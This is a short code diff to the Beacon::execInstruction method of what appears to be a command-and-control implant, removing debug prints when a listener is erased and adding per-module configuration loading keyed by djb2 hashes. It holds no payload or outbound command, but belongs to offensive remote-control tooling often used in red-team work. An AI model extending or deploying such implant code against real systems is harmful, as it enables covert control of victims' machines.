@@ -590,12 +590,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			{
 				c2RetMessage.set_cmd(cmd);
 				c2RetMessage.set_returnvalue((*object)->getListenerHash());
-
-				std::cout << "Listener found" << std::endl;
-				m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
-
-				std::cout << "erase" << std::endl;
-				
+				m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));				
 				return false;
 			}
 			else 
@@ -792,7 +787,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		nlohmann::json config = m_modulesConfig;
         for (auto& it : config.items())
 		{
-			unsigned long long moduleHash = djb2(it.key());			
+			unsigned long long moduleHash = djb2(it.key());		
 			if(moduleCmd_.get()->getHash() == moduleHash)
 			{
 				moduleCmd_.get()->initConfig(it.value());
@@ -870,6 +865,18 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		}
 
 		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
+
+		// initConfig for modules
+		nlohmann::json config = m_modulesConfig;
+        for (auto& it : config.items())
+		{
+			unsigned long long moduleHash = djb2(it.key());		
+			if(moduleCmd_.get()->getHash() == moduleHash)
+			{
+				moduleCmd_.get()->initConfig(it.value());
+			}
+		}
+
 		m_moduleCmd.push_back(std::move(moduleCmd_));
 
 		c2RetMessage.set_returnvalue(CmdStatusSuccess);
